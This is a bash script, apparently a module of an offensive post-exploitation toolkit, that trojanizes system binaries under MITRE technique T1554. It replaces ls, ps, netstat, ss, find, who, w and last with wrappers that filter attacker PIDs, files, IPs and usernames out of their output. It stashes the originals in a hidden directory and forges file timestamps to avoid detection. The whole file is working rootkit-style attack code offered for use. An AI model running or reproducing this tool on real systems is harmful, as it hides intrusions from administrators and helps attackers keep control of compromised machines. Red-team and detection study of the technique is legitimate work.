#!/bin/bash
#
# binary_replace.sh — T1554 Compromise Host Software Binary
#
# Replace system binaries (ls, ps, netstat, ss, find, lsof, who, w, last)
# with wrapper scripts that call the real binary but filter out attacker
# artifacts (PIDs, files, connections, users).
#

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

STASH_DIR="/usr/lib/.d3m0n_originals"
MARKER="# d3m0n_trojanized"

banner_binreplace() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════════════╗"
    echo "  ║   T1554 — Compromise Host Software Binary             ║"
    echo "  ║   Trojanize ls/ps/netstat/ss/find/lsof/who/w/last     ║"
    echo "  ╚═══════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[!] Root required.${NC}"
        return 1
    fi
    return 0
}

# ── [1] Trojanize binaries — hide specified patterns ──
trojanize() {
    check_root || return 1

    echo -e "${CYAN}[*] Trojanize system binaries to hide attacker artifacts${NC}"
    echo ""
    echo -e "${YELLOW}[?] Strings to hide (space-separated, e.g. PIDs, filenames, IPs, users):${NC}"
    echo -e "${YELLOW}    Example: '1337 .d3m0n borg_ 10.10.14.5 hacker'${NC}"
    read -r HIDE_PATTERNS

    if [[ -z "$HIDE_PATTERNS" ]]; then
        echo -e "${RED}[!] No patterns specified.${NC}"
        return 1
    fi

    echo -e "${YELLOW}[?] Which binaries to trojanize?${NC}"
    echo "  [1] Core set (ls, ps, netstat, ss, find)"
    echo "  [2] Extended set (+ lsof, who, w, last)"
    echo "  [3] Custom selection"
    read -r BSET

    local -a BINARIES=()
    case "$BSET" in
        1) BINARIES=(ls ps netstat ss find) ;;
        2) BINARIES=(ls ps netstat ss find lsof who w last) ;;
        3)
            echo -e "${YELLOW}[?] Binary names (space-separated):${NC}"
            read -r CUSTOM_BINS
            BINARIES=($CUSTOM_BINS)
            ;;
        *) echo -e "${RED}[!] Invalid choice.${NC}"; return 1 ;;
    esac

    mkdir -p "$STASH_DIR" 2>/dev/null
    chmod 700 "$STASH_DIR"

    # Build the grep filter pattern
    local GREP_PATTERN=""
    for pat in $HIDE_PATTERNS; do
        if [[ -n "$GREP_PATTERN" ]]; then
            GREP_PATTERN="${GREP_PATTERN}|${pat}"
        else
            GREP_PATTERN="${pat}"
        fi
    done

    local success=0
    for bin in "${BINARIES[@]}"; do
        local bin_path
        bin_path=$(which "$bin" 2>/dev/null)
        if [[ -z "$bin_path" ]]; then
            echo -e "${YELLOW}  [!] Binary not found: ${bin}${NC}"
            continue
        fi

        # Check if already trojanized
        if head -1 "$bin_path" 2>/dev/null | grep -q "$MARKER"; then
            echo -e "${YELLOW}  [!] Already trojanized: ${bin_path}${NC}"
            continue
        fi

        # Stash the original
        local stash_name="${STASH_DIR}/.$(basename "$bin_path").orig"
        cp "$bin_path" "$stash_name" 2>/dev/null
        chmod 755 "$stash_name"

        # Preserve original permissions and timestamps
        local orig_perms orig_owner orig_ts
        orig_perms=$(stat -c %a "$bin_path")
        orig_owner=$(stat -c %U:%G "$bin_path")
        orig_ts=$(stat -c %Y "$bin_path")

        # Create wrapper script
        cat > "$bin_path" << WRAPEOF
#!/bin/bash
${MARKER}
# System binary wrapper
exec ${stash_name} "\$@" | grep -Ev '${GREP_PATTERN}'
WRAPEOF

        chmod "$orig_perms" "$bin_path"
        chown "$orig_owner" "$bin_path"
        touch -d "@${orig_ts}" "$bin_path" 2>/dev/null

        echo -e "${GREEN}  [+] Trojanized: ${bin_path} (original → ${stash_name})${NC}"
        success=$((success + 1))
    done

    echo ""
    echo -e "${GREEN}[+] ${success} binaries trojanized.${NC}"
    echo -e "${YELLOW}[*] Hidden patterns: ${HIDE_PATTERNS}${NC}"
    echo -e "${YELLOW}[*] Originals stashed in: ${STASH_DIR}${NC}"
}

# ── [2] Trojanize with process-aware filtering ──
trojanize_smart() {
    check_root || return 1

    echo -e "${CYAN}[*] Smart trojanize — process-aware filtering for ps/top${NC}"
    echo ""
    echo -e "${YELLOW}[?] PIDs to hide from ps (space-separated):${NC}"
    read -r HIDE_PIDS
    echo -e "${YELLOW}[?] Filenames/prefixes to hide from ls/find (space-separated):${NC}"
    read -r HIDE_FILES
    echo -e "${YELLOW}[?] IPs/ports to hide from netstat/ss (space-separated):${NC}"
    read -r HIDE_NET
    echo -e "${YELLOW}[?] Usernames to hide from who/w/last (space-separated):${NC}"
    read -r HIDE_USERS

    mkdir -p "$STASH_DIR" 2>/dev/null
    chmod 700 "$STASH_DIR"

    # Build filters
    local PID_FILTER="" FILE_FILTER="" NET_FILTER="" USER_FILTER=""
    for p in $HIDE_PIDS; do PID_FILTER="${PID_FILTER:+${PID_FILTER}|}${p}"; done
    for f in $HIDE_FILES; do FILE_FILTER="${FILE_FILTER:+${FILE_FILTER}|}${f}"; done
    for n in $HIDE_NET; do NET_FILTER="${NET_FILTER:+${NET_FILTER}|}${n}"; done
    for u in $HIDE_USERS; do USER_FILTER="${USER_FILTER:+${USER_FILTER}|}${u}"; done

    # Trojanize ps
    local ps_path
    ps_path=$(which ps 2>/dev/null)
    if [[ -n "$ps_path" && -n "$PID_FILTER" ]] && ! head -1 "$ps_path" 2>/dev/null | grep -q "$MARKER"; then
        local stash="${STASH_DIR}/.ps.orig"
        cp "$ps_path" "$stash"; chmod 755 "$stash"
        local orig_ts; orig_ts=$(stat -c %Y "$ps_path")
        cat > "$ps_path" << WRAPEOF
#!/bin/bash
${MARKER}
${stash} "\$@" | grep -Ev '${PID_FILTER}'
WRAPEOF
        chmod 755 "$ps_path"; touch -d "@${orig_ts}" "$ps_path" 2>/dev/null
        echo -e "${GREEN}  [+] ps trojanized (hiding PIDs: ${HIDE_PIDS})${NC}"
    fi

    # Trojanize ls
    local ls_path
    ls_path=$(which ls 2>/dev/null)
    if [[ -n "$ls_path" && -n "$FILE_FILTER" ]] && ! head -1 "$ls_path" 2>/dev/null | grep -q "$MARKER"; then
        local stash="${STASH_DIR}/.ls.orig"
        cp "$ls_path" "$stash"; chmod 755 "$stash"
        local orig_ts; orig_ts=$(stat -c %Y "$ls_path")
        cat > "$ls_path" << WRAPEOF
#!/bin/bash
${MARKER}
${stash} "\$@" | grep -Ev '${FILE_FILTER}'
WRAPEOF
        chmod 755 "$ls_path"; touch -d "@${orig_ts}" "$ls_path" 2>/dev/null
        echo -e "${GREEN}  [+] ls trojanized (hiding files: ${HIDE_FILES})${NC}"
    fi

    # Trojanize netstat
    local ns_path
    ns_path=$(which netstat 2>/dev/null)
    if [[ -n "$ns_path" && -n "$NET_FILTER" ]] && ! head -1 "$ns_path" 2>/dev/null | grep -q "$MARKER"; then
        local stash="${STASH_DIR}/.netstat.orig"
        cp "$ns_path" "$stash"; chmod 755 "$stash"
        local orig_ts; orig_ts=$(stat -c %Y "$ns_path")
        cat > "$ns_path" << WRAPEOF
#!/bin/bash
${MARKER}
${stash} "\$@" | grep -Ev '${NET_FILTER}'
WRAPEOF
        chmod 755 "$ns_path"; touch -d "@${orig_ts}" "$ns_path" 2>/dev/null
        echo -e "${GREEN}  [+] netstat trojanized (hiding: ${HIDE_NET})${NC}"
    fi

    # Trojanize ss
    local ss_path
    ss_path=$(which ss 2>/dev/null)
    if [[ -n "$ss_path" && -n "$NET_FILTER" ]] && ! head -1 "$ss_path" 2>/dev/null | grep -q "$MARKER"; then
        local stash="${STASH_DIR}/.ss.orig"
        cp "$ss_path" "$stash"; chmod 755 "$stash"
        local orig_ts; orig_ts=$(stat -c %Y "$ss_path")
        cat > "$ss_path" << WRAPEOF
#!/bin/bash
${MARKER}
${stash} "\$@" | grep -Ev '${NET_FILTER}'
WRAPEOF
        chmod 755 "$ss_path"; touch -d "@${orig_ts}" "$ss_path" 2>/dev/null
        echo -e "${GREEN}  [+] ss trojanized (hiding: ${HIDE_NET})${NC}"
    fi

    # Trojanize who/w/last
    for cmd in who w last; do
        local cmd_path
        cmd_path=$(which "$cmd" 2>/dev/null)
        if [[ -n "$cmd_path" && -n "$USER_FILTER" ]] && ! head -1 "$cmd_path" 2>/dev/null | grep -q "$MARKER"; then
            local stash="${STASH_DIR}/.${cmd}.orig"
            cp "$cmd_path" "$stash"; chmod 755 "$stash"
            local orig_ts; orig_ts=$(stat -c %Y "$cmd_path")
            cat > "$cmd_path" << WRAPEOF
#!/bin/bash
${MARKER}
${stash} "\$@" | grep -Ev '${USER_FILTER}'
WRAPEOF
            chmod 755 "$cmd_path"; touch -d "@${orig_ts}" "$cmd_path" 2>/dev/null
            echo -e "${GREEN}  [+] ${cmd} trojanized (hiding users: ${HIDE_USERS})${NC}"
        fi
    done

    # Trojanize find
    local find_path
    find_path=$(which find 2>/dev/null)
    if [[ -n "$find_path" && -n "$FILE_FILTER" ]] && ! head -1 "$find_path" 2>/dev/null | grep -q "$MARKER"; then
        local stash="${STASH_DIR}/.find.orig"
        cp "$find_path" "$stash"; chmod 755 "$stash"
        local orig_ts; orig_ts=$(stat -c %Y "$find_path")
        cat > "$find_path" << WRAPEOF
#!/bin/bash
${MARKER}
${stash} "\$@" | grep -Ev '${FILE_FILTER}'
WRAPEOF
        chmod 755 "$find_path"; touch -d "@${orig_ts}" "$find_path" 2>/dev/null
        echo -e "${GREEN}  [+] find trojanized (hiding: ${HIDE_FILES})${NC}"
    fi

    echo -e "${GREEN}[+] Smart trojanization complete.${NC}"
}

# ── [3] Restore originals ──
restore_binaries() {
    check_root || return 1

    echo -e "${CYAN}[*] Restoring original binaries...${NC}"

    if [[ ! -d "$STASH_DIR" ]]; then
        echo -e "${RED}[!] No stashed originals found at ${STASH_DIR}${NC}"
        return 1
    fi

    for orig in "$STASH_DIR"/.*; do
        [[ -f "$orig" ]] || continue
        local basename
        basename=$(basename "$orig")
        # .ls.orig → ls
        local binname="${basename#.}"
        binname="${binname%.orig}"

        local bin_path
        bin_path=$(which "$binname" 2>/dev/null)
        if [[ -z "$bin_path" ]]; then
            # Try common paths
            for trypath in /usr/bin /bin /usr/sbin /sbin; do
                if [[ -f "${trypath}/${binname}" ]]; then
                    bin_path="${trypath}/${binname}"
                    break
                fi
            done
        fi

        if [[ -n "$bin_path" ]]; then
            cp "$orig" "$bin_path"
            echo -e "${GREEN}  [+] Restored: ${bin_path}${NC}"
        fi
    done

    rm -rf "$STASH_DIR"
    echo -e "${GREEN}[+] All binaries restored. Stash removed.${NC}"
}

# ── [4] Status check ──
status_check() {
    echo -e "${CYAN}[*] Trojanized Binary Status:${NC}"
    echo "─────────────────────────────────────────────"

    local found=0
    for bin in ls ps netstat ss find lsof who w last top htop; do
        local bin_path
        bin_path=$(which "$bin" 2>/dev/null)
        [[ -z "$bin_path" ]] && continue

        if head -1 "$bin_path" 2>/dev/null | grep -q "$MARKER"; then
            echo -e "  ${RED}[TROJANIZED]${NC} ${bin_path}"
            found=1
        else
            echo -e "  ${GREEN}[CLEAN]${NC}      ${bin_path}"
        fi
    done

    if [[ -d "$STASH_DIR" ]]; then
        echo ""
        echo -e "${YELLOW}[*] Stashed originals:${NC}"
        ls -la "$STASH_DIR"/ 2>/dev/null
    fi
}

# ── MAIN MENU ──
main_menu() {
    banner_binreplace
    echo -e "  ${CYAN}[1]${NC} Trojanize binaries (hide patterns from output)"
    echo -e "  ${CYAN}[2]${NC} Smart trojanize (per-binary filtering: PIDs/files/net/users)"
    echo -e "  ${CYAN}[3]${NC} Restore original binaries"
    echo -e "  ${CYAN}[4]${NC} Status check"
    echo ""
    echo -e "${YELLOW}[?] Select option:${NC} "
    read -r OPT

    case "$OPT" in
        1) trojanize ;;
        2) trojanize_smart ;;
        3) restore_binaries ;;
        4) status_check ;;
        *) echo -e "${RED}[!] Invalid option.${NC}" ;;
    esac
}

main_menu
